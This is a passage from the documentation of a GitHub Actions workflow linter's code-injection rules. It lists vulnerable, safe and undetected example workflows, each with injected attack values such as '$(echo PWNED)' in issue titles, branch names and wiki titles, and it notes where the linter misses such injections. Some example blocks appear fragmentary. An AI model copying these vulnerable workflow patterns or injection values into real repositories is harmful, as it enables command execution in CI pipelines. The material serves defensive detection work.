      ```yaml
      # reason: GitHub runs the job test only after the job build succeeded, so in
      #   each step of the job test the needs.build.result value is success; the
      #   if of the step is then true only when github.head_ref equals release,
      #   ignoring the case of the letters, and a github.head_ref value of release
      #   in upper case or lower case letters holds no shell code
      #   (https://github.com/github/docs/blob/404a5f4de6cd5311e3ce2d5c076571291e0107d6/data/reusables/actions/jobs/section-using-jobs-in-a-workflow-needs.md).
      # attack-value: github.head_ref = "$(echo PWNED)"
      # attack-run-behavior: the attacker opens a pull request from a fork whose
      #   branch is named $(echo PWNED); the job build succeeds, so the if of the
      #   step is false, and GitHub skips the step.
      on: pull_request_target
      permissions: {}
      jobs:
        build:
          runs-on: ubuntu-latest
          steps:
            - run: echo built
        test:
          needs: build
          runs-on: ubuntu-latest
          steps:
            - if: ${{ needs.build.result == 'failure' || github.head_ref == 'release' }}
              run: echo "${{ github.head_ref }}"
      ```
    - controlled.unlisted-activity-type.yml (workflow, true-negative)
      ```yaml
      # situation: the job runs on issues field_added and writes
      #   github.event.label.name in a run.
      # reason: the payload of issues field_added has no label, so
      #   github.event.label.name is empty and no value of the attacker's reaches
      #   the shell.
      # attack-value: github.event.label.name = "\"; echo PWNED; echo \""
      # attack-run-behavior: the payload of issues field_added has no label, so
      #   the expression is empty and the script is echo "".
      on:
        issues:
          types: [field_added]
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - run: echo "${{ github.event.label.name }}"
      ```
    - controlled.unnamed-format-argument.yml (workflow, true-negative)
      ```yaml
      # situation: on a push, a step writes format('{0}', github.sha,
      #   github.event.head_commit.message) into a run: the format string names
      #   only its first argument after it.
      # reason: the runner evaluates and writes only the arguments that the
      #   placeholders of the format string name; the message is not named, so
      #   the script gets the SHA alone.
      # attack-value: github.event.head_commit.message = "\"; echo PWNED; echo \""
      # attack-run-behavior: the runner writes the SHA, the script becomes echo
      #   "<the SHA>", and echo prints the SHA.
      on: push
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - run: echo "${{ format('{0}', github.sha, github.event.head_commit.message) }}"
      ```
    - controlled.yml (workflow, true-negative)
      ```yaml
      # situation: on an opened issue, a step passes the issue's title in the
      #   environment variable ISSUE_TITLE and runs echo with it.
      # reason: the title is not pasted into the script by ${{ }} before the shell
      #   parses it; the shell expands ${ISSUE_TITLE} after parsing, inside double
      #   quotes, so a quote or $( ) in the title is text, not code.
      # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
      # attack-run-behavior: the script stays echo "${ISSUE_TITLE}", and
      #   ISSUE_TITLE holds the value; bash expands the variable after it parses
      #   the script, and echo prints the line "; echo PWNED; echo " as text.
      on:
        issues:
          types: [opened]
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - run: echo "${ISSUE_TITLE}"
              env:
                ISSUE_TITLE: ${{ github.event.issue.title }}
      ```
- code-injection.env-variable
  - detected: the script of the step (run:) passes the value of the variable {variable} to {code_reading}, and the value of the variable comes from {expr_ref}, which an attacker controls on {controlled_on}
  - arguments:
    - {variable}: The variable, written as in the run, such as \$ISSUE_TITLE, or the bare name of a variable in an arithmetic expression, such as TITLE in \$(( TITLE + 1 )).
    - {code_reading}: How bash, or a program that bash gives the value to, reads the value of a variable as code.
    - {expr_ref}: The reference that an attacker controls in the value of env, such as github.event.issue.title, or the value of the github context that the runner writes into the variable, such as github.head_ref for GITHUB_HEAD_REF.
    - {controlled_on}: The events on which an attacker controls the value of the variable, each event named once.
  - consequence: the value becomes code
  - remedy: do not pass the variable to eval (eval "..."), to the code that a shell or an interpreter takes after -c (bash -c "...", python3 -c "..."), to the command name at the start of a command (\$VAR arg), to the input of a shell (| bash) or to arithmetic (\$(( ... )), &#91;&#91; ... -eq ... ]]); pass the variable only as an argument of a command that reads the argument as data, such as printf '%s\\n' "\$VAR". Keep the variable inside double quotes there: without the quotes the value stays data, but bash splits the value into words and expands \* and ?
  - severity: critical (found from the CVSS metrics below by the table)
  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
  - attackers: fork-pr-author, issue-author, commenter, merged-commit-author, anyone-who-forks
  - preconditions: value-read-as-code, attacker-writes, attacker-event, callers-events, app-status-check
  - true positives:
    - env-variable.arithmetic.yml (workflow, true-positive)
      ```yaml
      # situation: on an opened issue, a step passes the issue's title in the
      #   environment variable ISSUE_TITLE and compares the variable as a number
      #   in [[ -eq ]].
      # reason: [[ -eq ]] evaluates the value of the variable as an arithmetic
      #   expression. The attacker's value brings an array subscript, a[$(...)],
      #   and bash runs the command substitution in that subscript.
      # attack-value: github.event.issue.title = "a[$(echo PWNED >/proc/$$/fd/1)]"
      # attack-run-behavior: bash evaluates the value as arithmetic and runs the
      #   command substitution in the subscript, which writes PWNED to the
      #   standard output of the bash of the step ($$); the expression is 0, and
      #   echo prints zero.
      on:
        issues:
          types: [opened]
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - env:
                ISSUE_TITLE: ${{ github.event.issue.title }}
              run: if [[ $ISSUE_TITLE -eq 0 ]]; then echo zero; fi
      ```

      ```yaml
      # attack-value: github.event.issue.title = "echo PWNED"
      # attack-run-behavior: eval runs echo PWNED, and echo prints PWNED.

        issues:
          types: [opened]
      jobs:

          runs-on: ubuntu-latest

            - env:
      ```

    - env-variable.command-word.yml (workflow, true-positive)
      ```yaml

      #   environment variable ISSUE_TITLE and runs the variable, outside quotes,

      #   word names the program that runs with the other words as its arguments,

      #   prints PWNED.
      ```

    - env-variable.element-before-command.yml (workflow, true-positive)

      ```yaml
      #   environment variable ISSUE_TITLE and runs eval on the variable in a $( ) in
      ```

- code-injection.env-variable-wiki
  - detected: the script of the step (run:) passes the value of the variable {variable} to {code_reading}, and the value of the variable comes from {expr_ref}, which an attacker controls on gollum
  - arguments:
    - {variable}: The variable, written as in the run.
    - {code_reading}: How bash, or a program that bash gives the value to, reads the value of a variable as code.
    - {expr_ref}: The reference that an attacker controls in the value of env.
  - consequence: the value becomes code
  - remedy: do not pass the variable to eval (eval "..."), to the code that a shell or an interpreter takes after -c (bash -c "...", python3 -c "..."), to the command name at the start of a command (\$VAR arg), to the input of a shell (| bash) or to arithmetic (\$(( ... )), &#91;&#91; ... -eq ... ]]); pass the variable only as an argument of a command that reads the argument as data, such as printf '%s\\n' "\$VAR". Keep the variable inside double quotes there: without the quotes the value stays data, but bash splits the value into words and expands \* and ?
  - severity: critical (found from the CVSS metrics below by the table)
  - fact kinds: repo.wiki-open (provider: repo-setting)
  - attackers: wiki-editor
  - preconditions: value-read-as-code, attacker-event, callers-events, wiki-open
  - true positives:
    - env-variable-wiki.yml (workflow, true-positive)
      ```yaml
      # situation: on gollum, a step passes the title of the first wiki page
      #   changed in the environment variable PAGE_TITLE and runs eval with it.
      # reason: anyone may edit the wiki when it is open to all (repo.wiki-open
      #   true), and eval reads the expanded text as a command.
      # attack-value: github.event.pages[0].title = "$(echo PWNED)"
      # attack-run-behavior: eval reads echo $(echo PWNED) as a command, runs the
      #   command substitution and prints PWNED.
      on: gollum
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - env:
                PAGE_TITLE: ${{ github.event.pages[0].title }}
              run: eval "echo $PAGE_TITLE"
      ```
  - true negatives:
    - env-variable-wiki.yml (workflow, true-negative)
      ```yaml
      # situation: on gollum, a step passes the title of the first wiki page
      #   changed in the environment variable PAGE_TITLE and prints the variable
      #   with printf, inside double quotes.
      # reason: printf reads the value as text; nothing reads the value again as
      #   code.
      # attack-value: github.event.pages[0].title = "$(echo PWNED)"
      # attack-run-behavior: printf prints the line $(echo PWNED) as text.
      on: gollum
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - env:
                PAGE_TITLE: ${{ github.event.pages[0].title }}
              run: |
                printf '%s\n' "$PAGE_TITLE"
      ```
- code-injection.wiki
  - detected: {expr_ref} is written into {sink_kind} by \${{ }}, and an attacker controls it on gollum
  - arguments:
    - {expr_ref}: The reference in the expression.
    - {sink_kind}: The kind of script in which a value is written as code: the run script of a step, or the script of actions/github-script.
  - consequence: the value becomes code
  - remedy: pass it through env and read the variable
  - severity: critical (found from the CVSS metrics below by the table)
  - fix kinds: env-var, env-var-review
  - fact kinds: repo.wiki-open (provider: repo-setting)
  - attackers: wiki-editor
  - preconditions: runner-writes, attacker-event, callers-events, wiki-open
  - true positives:
    - wiki.yml (workflow, true-positive)
      ```yaml
      # situation: on gollum, a run step echoes the title of the first wiki page
      #   changed, written in by ${{ }}.
      # reason: anyone may edit the wiki when it is open to all (repo.wiki-open
      #   true), and ${{ }} puts the page's title into the script before the shell
      #   parses it, so a double quote in it ends the echo's string and what follows
      #   runs as commands.
      # attack-value: github.event.pages[0].title = "$(echo PWNED)"
      # attack-run-behavior: the script becomes echo "$(echo PWNED)", and bash
      #   runs the command substitution inside the double quotes, so echo prints
      #   PWNED.
      on: gollum
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - run: echo "${{ github.event.pages[0].title }}"
      ```
  - true negatives:
    - wiki.yml (workflow, true-negative)
      ```yaml
      # situation: on gollum, a step passes the title of a wiki page in the
      #   environment variable PAGES_TITLE and runs echo with it.
      # reason: the title is not pasted into the script by ${{ }} before the shell
      #   parses it; the shell expands ${PAGES_TITLE} after parsing, inside double
      #   quotes, so a quote or $( ) in the title is text, not code.
      # attack-value: github.event.pages[0].title = "$(echo PWNED)"
      # attack-run-behavior: the script stays echo "${PAGES_TITLE}", and
      #   PAGES_TITLE holds the value; bash expands the variable after it parses
      #   the script, without running a command substitution in its text, and echo
      #   prints the line $(echo PWNED) as text.
      on: gollum
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - run: echo "${PAGES_TITLE}"
              env:
                PAGES_TITLE: ${{ github.event.pages[0].title }}
      ```

### fix kinds

- env-var: move the expressions into the env of the step, and read the variables where they were, quoted as the shell needs (bash and sh)
  - safety: review
  - possible side effects:
    - value-not-read-as-script: The value of the \${{ }} expression is no longer parsed by the program that reads the script (the shell, or the JavaScript runtime of actions/github-script) as part of the script text: characters of the value that the program interpreted before the fix (such as \$, \`, \\, double quotes and line breaks) are taken as plain characters, and a workflow that relied on the program interpreting those characters runs differently.
- env-var-review: move the expressions into the env of the step and read them as "\${NAME}" where they were unquoted (bash and sh), as \$env:NAME (pwsh) or as process.env.NAME (github-script); take the line breaks out of what is written to \$GITHUB_ENV or \$GITHUB_OUTPUT, or make the delimiter of name&lt;&lt;DELIM random
  - safety: review
  - possible side effects:
    - unquoted-one-word: An unquoted place becomes one word: a value with blanks is no longer read as several words, and outside &#91;&#91; ]] is no longer globbed.
    - pattern-literal: On the right of ==, =, != or =\~ inside &#91;&#91; ]], the value is compared as a string, not matched as a pattern or a regular expression.
    - pwsh-unchecked: The rule does not read the quoting of pwsh, so how \$env:NAME is read at that place is not checked.
    - github-script-unchecked: The rule does not read the JavaScript of github-script, so how process.env.NAME is read at that place is not checked.
    - line-breaks-removed: The line breaks of a value written to \$GITHUB_ENV or \$GITHUB_OUTPUT are taken out, which changes a value that had them.
    - random-delimiter: The random delimiter is made with od and /dev/urandom; in a container without them the step fails.
    - value-not-read-as-script: The value of the \${{ }} expression is no longer parsed by the program that reads the script (the shell, or the JavaScript runtime of actions/github-script) as part of the script text: characters of the value that the program interpreted before the fix (such as \$, \`, \\, double quotes and line breaks) are taken as plain characters, and a workflow that relied on the program interpreting those characters runs differently.

### undetected forms

- wiki-summary: the summary of a wiki page (github.event.pages&#91;\*].summary) in a job that runs on gollum: the rule reads the summary as a value that nobody writes. The gollum payloads that the authors of the linter saw had a null summary each time: for pages made and edited on the web interface of GitHub and pushed by git, an edit message on the web interface and a commit message of git did not go into the summary. The authors saw only pages that the owner of a public repository made and edited, and did not try an edit by an account with no role in the repository
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: limitation (decided by: run-time)
  - example: wiki-summary.yml (workflow, undetected)
    ```yaml
    # situation: on gollum, a step writes the summary of the wiki page into its
    #   run script by ${{ }}.
    # reason: a limitation (run time): GitHub decides the summary of a wiki page
    #   when the event happens. The gollum payloads that the authors of the
    #   linter saw had a null summary each time, for pages made and edited on
    #   the web interface and pushed by git; an edit by an account with no role
    #   in the repository was not tried.
    # cause: the rule reads the summary of a wiki page as a value that nobody
    #   writes.
    # attack-value: github.event.pages[0].summary = "$(echo PWNED)"
    # attack-run-behavior: if GitHub ever put a summary that the editor of the
    #   wiki writes in the payload, $( ) in the summary would run in the step.
    on: gollum
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - run: echo "${{ github.event.pages[0].summary }}"
    ```
- fork-review: a job on pull_request_review or pull_request_review_comment that runs only for a pull request from a fork, such as a job whose if: condition is github.event.pull_request.head.repo.full_name != github.repository: the run of a review that the attacker writes on the pull request of another person from a fork has the secrets of the repository or a token that writes only where a private repository gives secrets or a token that writes to the runs of pull requests from forks (repo.fork-pr-secrets, repo.fork-pr-write-tokens). The rule does not read the facts repo.fork-pr-secrets and repo.fork-pr-write-tokens for the runs of a review, and does not count the run of a review of a pull request from a fork as a run of the attacker. When the attacker opened the pull request from a fork, a review of that pull request gives the attacker nothing more than the pull request itself gives: the run takes the workflow of the merge commit of the pull request (GitHub's documentation gives refs/pull/&lt;n>/merge as the ref of the run of a review), and the attacker can change that workflow in the pull request
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: fact)
  - example: fork-review.yml (workflow, undetected)
    ```yaml
    # situation: on comments on the diff, a step writes the comment's body
    #   into the run: script with ${{ }}, in a job that runs only for a pull
    #   request from a fork.
    # reason: a todo (a fact): the job runs only for a pull request from a
    #   fork. Where a private repository gives secrets or a token that writes
    #   to the runs of pull requests from forks, the run of a review that the
    #   attacker writes on the pull request of another person from a fork has
    #   those secrets or that token, and the job runs for the attacker.
    # cause: the rule does not read the settings of a private repository for
    #   the runs of pull requests from forks, and does not count the run of a
    #   review of a pull request from a fork as a run of the attacker.
    # attack-value: github.event.comment.body = "\"; echo PWNED; echo \""
    # attack-run-behavior: the attacker comments on the diff of the pull
    #   request of another person from a fork; the comment starts the job a,
    #   the script becomes echo ""; echo PWNED; echo "", and echo PWNED runs
    #   in the run that has the secrets.
    on: pull_request_review_comment
    jobs:
      a:
        if: github.event.pull_request.head.repo.full_name != github.repository
        runs-on: ubuntu-latest
        steps:
          - run: echo "${{ github.event.comment.body }}"
    ```
- if-compared: a value that an if compares with strings that the workflow writes in the if (strings compared by == with the value and joined by ||, or the strings of contains(fromJSON('&#91;...]'), value)), where each string has only ASCII letters, digits, spaces, -, \_, . and /, does not start with -, and has no - right after a space. The if of the job limits the value in every step of the job, and the if of a step with a run: script limits the value in that step only. In those steps the value equals one of the strings when the case of the letters is ignored, so the rule does not report the value. The attacker still chooses the case of each letter of the value. GitHub's server, which evaluates the if of a job, also takes the Kelvin sign as equal to the letter k and the long s as equal to the letter s; the runner, which evaluates the if of a step, takes the Kelvin sign as equal to the letter k. Where the case of a letter changes what the value names, such as a command, a variable, a file on a file system that tells names apart by their case (the default file system of a Linux runner), a host or a tool, the choice of the case can cause harm
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: same-file)
  - example: if-compared.yml (workflow, undetected)
    ```yaml
    # situation: on issue_comment, a job runs only when the comment's body is
    #   path, and the run: script of a step writes
    #   ${{ github.event.comment.body }} as the name of a variable in an
    #   assignment before a command (NAME=value command).
    # reason: the job's if lets the body be only the string path, ignoring the
    #   case of its letters, so the body has no character that the shell reads
    #   as code; the attacker still chooses the case, and PATH is another
    #   variable than path.
    # cause: the rule does not treat a value that the if of the job compares
    #   with such a string as written by the attacker.
    # attack-value: github.event.comment.body = "PATH"
    # attack-run-behavior: the if passes, and the script becomes
    #   PATH=/tmp/tools ./build.sh, so the shell looks for the commands of
    #   build.sh in /tmp/tools.
    on:
      issue_comment:
        types: [created]
    jobs:
      j:
        if: github.event.comment.body == 'path'
        runs-on: ubuntu-latest
        steps:
          - run: ${{ github.event.comment.body }}=/tmp/tools ./build.sh
    ```
- if: an expression in an if: the runner evaluates it, and no shell or JavaScript reads it
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: no-added-gain
  - example: if.yml (workflow, undetected)
    ```yaml
    # situation: on issues, the ifs of a job and of a step compare the issue's
    #   title and body.
    # reason: no added gain: the runner evaluates an if, and no shell or
    #   JavaScript reads it.
    # cause: the rule reads a step's run and the script of
    #   actions/github-script, not an if.
    # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: the runner evaluates the job's if, which compares the
    #   value with x as a string, and the step's if; the value goes into no
    #   script, and the step's script is echo hi.
    on: issues
    jobs:
      j:
        runs-on: ubuntu-latest
        if: github.event.issue.title != 'x'
        steps:
          - if: github.event.issue.body != 'y'
            run: echo hi
    ```
- env-value: an expression in a value of env, whose variable a run of bash or sh reads only where the value stays data: inside double quotes, or outside quotes, as an argument of a command that reads the argument as data (echo "\$TITLE"); in an assignment; in the body of a heredoc that a command reads as data; or no script reads the variable. bash expands the variable after bash parses the script, and the command reads the value as text. The rule reports the variable where bash, or a program, reads the value as code (code-injection.env-variable). This undetected form is only for a value that no command writes into a file that a later command or step runs as code; a value written into such a file is the undetected form written-file
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: no-added-gain
  - example: env-value.yml (workflow, undetected)
    ```yaml
    # situation: on issues, the issue's title is in a value of env of a step of
    #   actions/github-script and of a run, which read it as a variable.
    # reason: no added gain: both steps read the variable as data, and nothing
    #   reads the value again as code.
    # cause: the rule reads a variable of env only where bash, or a program, reads
    #   the value of the variable as code (code-injection.env-variable).
    # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: TITLE holds the value in both steps:
    #   actions/github-script logs process.env.TITLE, and the run step's script
    #   stays echo "$TITLE", which bash expands after it parses the script, so
    #   echo prints the line "; echo PWNED; echo " as text.
    on: issues
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/github-script@v7
            with:
              script: console.log(process.env.TITLE)
            env:
              TITLE: ${{ github.event.issue.title }}
          - run: echo "$TITLE"
            env:
              TITLE: ${{ github.event.issue.title }}
    ```
- env-variable-command-name: a variable of env inside quotes as the command word of a run of bash ("\$TOOL" --version): the value names the program that runs, with the arguments that the script writes. Whether an attacker can cause harm by naming a program that the runner has was not checked
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: same-file)
  - example: env-variable-command-name.yml (workflow, undetected)
    ```yaml
    # situation: on an opened issue, a step passes the issue's title in the
    #   environment variable ISSUE_TITLE and runs the variable inside quotes as
    #   the command word.
    # reason: the value names the program that runs with the argument --version;
    #   whether naming a program that the runner has causes harm was not
    #   checked.
    # cause: the rule does not report a variable inside quotes as the command
    #   word.
    # attack-value: github.event.issue.title = "$(echo PWNED)"
    # attack-run-behavior: bash looks for a program named $(echo PWNED), finds
    #   none and fails; nothing runs the command substitution.
    on:
      issues:
        types: [opened]
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - env:
              ISSUE_TITLE: ${{ github.event.issue.title }}
            run: |
              "$ISSUE_TITLE" --version
    ```
- env-variable-source: a variable of env as the file name of source or . in a run of bash (source "\$FILE"): the value names the file whose text runs as code. The rule reads the commands source and . (dot) only where the file name is the literal text /dev/stdin, and the value of the variable comes in as the input (code-input); whether an attacker can name a file that holds code on the runner was not checked
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: same-file)
  - example: env-variable-source.yml (workflow, undetected)
    ```yaml
    # situation: on an opened issue, a step passes the issue's title in the
    #   environment variable ISSUE_TITLE and runs source with the variable as
    #   the file name.
    # reason: the value names the file whose text runs as code; whether an
    #   attacker can name a file that holds code on the runner was not checked.
    # cause: the rule reads source only where the file name is /dev/stdin.
    # attack-value: github.event.issue.title = "$(echo PWNED)"
    # attack-run-behavior: source looks for a file named $(echo PWNED), finds
    #   none and fails; nothing runs the command substitution.
    on:
      issues:
        types: [opened]
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - env:
              ISSUE_TITLE: ${{ github.event.issue.title }}
            run: source "$ISSUE_TITLE"
    ```
- env-variable-nested: a variable of env at a place of a run of bash that the rule does not follow: the old arithmetic expansion \$&#91; ], the patterns and the commands of each clause of case, a heredoc that starts inside \$( ), the line where the script leaves a quote or a heredoc open and the lines after it (bash runs the lines after a heredoc that is not closed); and the script that another shell reads from the body of a heredoc whose delimiter is quoted, or from the code after -c in single quotes (bash -c 'eval "\$V"'), where that shell expands the variable
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: same-file)
  - example: env-variable-nested.yml (workflow, undetected)
    ```yaml
    # situation: on an opened issue, a step passes the issue's title in the
    #   environment variable ISSUE_TITLE and writes the variable inside a -c in
    #   single quotes of bash.
    # reason: the inner bash expands the variable and eval reads the value as a
    #   command, but the outer script holds no expansion of the variable.
    # cause: the rule does not read the script that another shell reads from a -c
    #   in single quotes.
    # attack-value: github.event.issue.title = "$(echo PWNED)"
    # attack-run-behavior: the inner bash expands $ISSUE_TITLE, eval reads echo
    #   $(echo PWNED) and prints PWNED.
    on:
      issues:
        types: [opened]
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - env:
              ISSUE_TITLE: ${{ github.event.issue.title }}
            run: |
              bash -c 'eval "echo $ISSUE_TITLE"'
    ```
- env-variable-runs-argument: a variable of env as an argument of a command that runs the argument as a command or as code, or in an assignment to an integer variable, where the rule's table of commands has no record that the value of a variable was seen to run as code with that command or option: xargs, find -exec, ssh, docker run with sh -c, and the code options of interpreters that the table does not list; and an assignment to a variable that declare -i, typeset -i or local -i gives the integer attribute, whose value bash reads as arithmetic; and the input of a shell or an interpreter that the rule does not read as code: after an option that the table does not declare (bash -o pipefail &lt;&lt;EOF), from a group of commands or a function before a pipe ({ echo "\$V"; } | bash), or of an interpreter that the table does not declare as one that runs its input (node &lt;&lt;EOF)
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: same-file)
  - example: env-variable-runs-argument.yml (workflow, undetected)
    ```yaml
    # situation: on an opened issue, a step passes the issue's title in the
    #   environment variable ISSUE_TITLE and gives the variable, outside quotes,
    #   to xargs as the command to run.
    # reason: xargs runs its arguments as a command, but the rule's table of
    #   commands does not say so.
    # cause: the rule reads the arguments of a command as code only where the
    #   table of commands says that a test saw the value run.
    # attack-value: github.event.issue.title = "sh -c echo${IFS}PWNED"
    # attack-run-behavior: xargs runs sh -c echo${IFS}PWNED, which prints PWNED.
    on:
      issues:
        types: [opened]
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - env:
              ISSUE_TITLE: ${{ github.event.issue.title }}
            run: xargs $ISSUE_TITLE </dev/null
    ```
- env-variable-coproc: a variable of env that a run of bash writes to the input of a coproc whose command runs the input of the coproc as code (coproc bash; echo "\$TITLE" >&\${COPROC&#91;1]}), directly or through a descriptor number that the script copies or stores (exec 4>&\${COPROC&#91;1]}; echo "\$TITLE" >&4, or fd=\${COPROC&#91;1]}; echo "\$TITLE" >&\$fd, or exec >&\${COPROC&#91;1]}; echo "\$TITLE"): the rule does not read the input of a coproc as code for the value of a variable. For a \${{ }} written in a command whose redirect target holds an element of the coproc's array as a parameter (>&\${COPROC&#91;1]}), the rule gives no fix; for a \${{ }} written in a command that writes through a copied or stored descriptor number, or through arithmetic on the array (\$((COPROC&#91;1]))), the fix moves the value to env, and the injection stays after the fix in this form
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: same-file)
  - example: env-variable-coproc.yml (workflow, undetected)
    ```yaml
    # situation: on an opened issue, a step passes the issue's title in the
    #   environment variable ISSUE_TITLE, starts bash as a coproc, and writes
    #   the variable to the coproc's input through a descriptor copied from the
    #   coproc's array.
    # reason: the coproc's bash runs what it reads from its input as code, and
    #   the descriptor 4 is a copy of the coproc's input.
    # cause: the rule does not read the input of a coproc as code for the value
    #   of a variable, and does not follow a descriptor copied from the
    #   coproc's array.
    # attack-value: github.event.issue.title = "echo PWNED"
    # attack-run-behavior: the coproc's bash runs echo PWNED, and cat prints
    #   PWNED from the coproc's output.
    on:
      issues:
        types: [opened]
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - env:
              ISSUE_TITLE: ${{ github.event.issue.title }}
            run: |
              coproc bash
              exec 4>&"${COPROC[1]}"
              echo "$ISSUE_TITLE" >&4
              exec 4>&- {COPROC[1]}>&-
              cat <&"${COPROC[0]}"
    ```
- associative-scope: a variable of env in a subscript of an indexed array whose name a declare, typeset or local command of the script declares associative with -A where the declaration does not hold at the subscript: a declaration inside a function, a declaration after the subscript, a declaration followed by an unset of the name, or a declaration that bash refuses because the name already holds an indexed array (f() { declare -A m; }; m=(1); echo "\${m&#91;\$KEY]}", or echo "\${m&#91;\$KEY]}"; declare -A m, or declare -A m; unset m; m=(1); echo "\${m&#91;\$KEY]}", or m=(1); declare -A m; echo "\${m&#91;\$KEY]}"): the rule reads every name that such a command declares with -A as associative in the whole script, so the rule does not read the subscript as arithmetic. A \${{ }} written in such a subscript gets no fix
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: same-file)
  - example: associative-scope.yml (workflow, undetected)
    ```yaml
    # situation: on an opened issue, a step passes the issue's title in the
    #   environment variable ISSUE_TITLE, defines a function that declares m
    #   associative with declare -A, does not call the function, assigns an
    #   indexed array to m, and prints the element of m whose subscript is
    #   ISSUE_TITLE.
    # reason: the function does not run, so m is an indexed array, and bash
    #   reads the subscript of an indexed array as arithmetic, which runs a
    #   command substitution in the value.
    # cause: the rule reads the declare -A in the function as holding in the
    #   whole script, so the rule reads m as an associative array and does not
    #   read the subscript as arithmetic.
    # attack-value: github.event.issue.title = "a[$(echo PWNED >/proc/$$/fd/1)]"
    # attack-run-behavior: bash runs echo PWNED while bash reads the
    #   subscript, and PWNED shows on the standard output.
    on:
      issues:
        types: [opened]
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - env:
              ISSUE_TITLE: ${{ github.event.issue.title }}
            run: |
              f() { declare -A m; }
              m=(1)
              echo "${m[$ISSUE_TITLE]}"
    ```
- env-variable-structured: a value of env that an attacker shapes only within a structured form (the name of a branch, a URL that GitHub builds, the name of a repository), read as the command name at the start of a command outside quotes, or in arithmetic: there the value runs as code only when the value has a space or a tab (the command name) or a &#91; (arithmetic). Git does not allow a space or &#91; in the name of a branch; the characters of the other values were not checked
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: same-file)
  - example: env-variable-structured.yml (workflow, undetected)
    ```yaml
    # situation: on pull_request_target, a step passes github.head_ref in the
    #   environment variable HEAD and runs the variable, outside quotes, as the
    #   command word.
    # reason: as the command word the value runs only when the value splits
    #   into a program and its arguments at a blank; Git does not allow a space
    #   in the name of a branch.
    # cause: the rule reads a structured value as the command word or in
    #   arithmetic only where the value can hold a blank or a [.
    # attack-value: github.head_ref = "$(echo${IFS}PWNED)"
    # attack-run-behavior: bash looks for a program named $(echo${IFS}PWNED),
    #   finds none and fails; nothing runs the command substitution.
    on: pull_request_target
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - env:
              HEAD: ${{ github.head_ref }}
            run: $HEAD
    ```
- env-variable-sh: a variable of env in a run of sh (shell: sh, or a custom shell of sh such as sh -e {0}), or in a run whose shell the rule does not tell is bash (a shell: value of bash with an option that the rule does not read, such as bash -c 'make' {0}, a shell: value that names bash by a path on a runner that the rule does not know to have the path, a shell: that is an expression, or a runner that runs-on does not name, which can be a Windows runner, whose default shell is pwsh), read where bash reads the value as code: the rule reads the variables of runs of bash only, as the four ways in which bash reads the value of a variable as code (code_reading) were observed with bash only, and the sh of a runner can be another shell, such as dash
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: same-file)
  - example: env-variable-sh.yml (workflow, undetected)
    ```yaml
    # situation: on an opened issue, a step passes the issue's title in the
    #   environment variable ISSUE_TITLE and runs eval with the variable in a
    #   run of sh.
    # reason: the sh of the runner may be dash, with which the readings were not
    #   observed.
    # cause: the rule reads the variables of runs of bash only.
    # attack-value: github.event.issue.title = "$(echo PWNED)"
    # attack-run-behavior: with bash as sh, eval reads echo $(echo PWNED) as a
    #   command and prints PWNED; the form was not run with dash.
    on:
      issues:
        types: [opened]
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - env:
              ISSUE_TITLE: ${{ github.event.issue.title }}
            shell: sh
            run: eval "echo $ISSUE_TITLE"
    ```
- login-startup-file: a value that an attacker controls and that a step writes to a startup file of a login shell (\~/.bash_profile, \~/.bash_login, \~/.profile, or a file under /etc/profile.d), where a later step has a shell: value that starts bash as a login shell (-l, +l or --login): bash runs the startup file before the script of the later step, and the rule does not read the write to the startup file as a write of code
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: same-file)
  - example: login-startup-file.yml (workflow, undetected)
    ```yaml
    # situation: on an opened issue, a step appends the issue's title to
    #   ~/.bash_profile, and a later step runs a script whose shell: is
    #   bash -l {0}.
    # reason: a todo (the same file): bash -l runs the startup files of a login
